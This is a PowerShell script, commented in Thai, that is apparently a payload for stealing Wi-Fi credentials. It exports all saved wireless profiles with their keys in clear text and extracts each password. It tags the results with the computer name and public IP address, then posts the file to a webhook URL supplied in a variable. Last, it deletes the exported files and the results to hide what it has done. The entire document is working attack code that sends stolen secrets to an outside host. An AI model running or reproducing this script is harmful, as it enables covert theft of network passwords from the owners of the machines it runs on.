cd $env:TEMP
netsh wlan export profile key=clear
Set-ExecutionPolicy Bypass -Scope Process -Force

# ค้นหาไฟล์ Wi*.xml และดึงชื่อและรหัสผ่าน Wi-Fi
Get-ChildItem Wi*.xml | ForEach-Object {
    $name = $_.BaseName -replace 'Wi-Fi-', ''
    $match = Select-String -Path $_.FullName -Pattern '<keyMaterial>(.+)</keyMaterial>'
    if ($match) {
        $password = $match.Matches.Groups[1].Value
        Write-Output ('Name: ' + $name + ', Password: ' + $password)
    }
} | Out-File "$env:TEMP\Wi-Fi-PASS.txt"

# สร้างชื่อไฟล์ใหม่และเปลี่ยนชื่อไฟล์
$computerName = $env:COMPUTERNAME
$publicIp = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=text')
$random = Get-Random -Minimum 100 -Maximum 1000
$newFileName = "Wi-Fi-PASS_(PC-$computerName)-(IP-$publicIp)_$random.txt"
Rename-Item -Path "$env:TEMP\Wi-Fi-PASS.txt" -NewName $newFileName

cls

# ส่งไฟล์ไปยัง Webhook

$newFileName = (Get-ChildItem -Path $env:TEMP -Filter 'Wi-Fi-PASS_*.txt').Name
$filePath = "$env:TEMP\$newFileName"
$fileContent = [System.IO.File]::ReadAllBytes($filePath)
$boundary = [System.Guid]::NewGuid().ToString()
$multipart = @()
$multipart += '--' + $boundary
$multipart += 'Content-Disposition: form-data; name="file"; filename="' + $newFileName + '"'
$multipart += 'Content-Type: text/plain'
$multipart += ''
$multipart += [System.Text.Encoding]::ASCII.GetString($fileContent)
$multipart += '--' + $boundary + '--'
$body = $multipart -join [Environment]::NewLine
Invoke-WebRequest -Uri $url -Method Post -ContentType ('multipart/form-data; boundary=' + $boundary) -Body $body

# ลบไฟล์ที่เกี่ยวข้อง
Remove-Item "$env:TEMP\Wi-Fi-PASS*.txt" -Force -ErrorAction SilentlyContinue
Remove-Item Wi*.xml -Force -ErrorAction SilentlyContinue

# ออกจากสคริปต์
exit
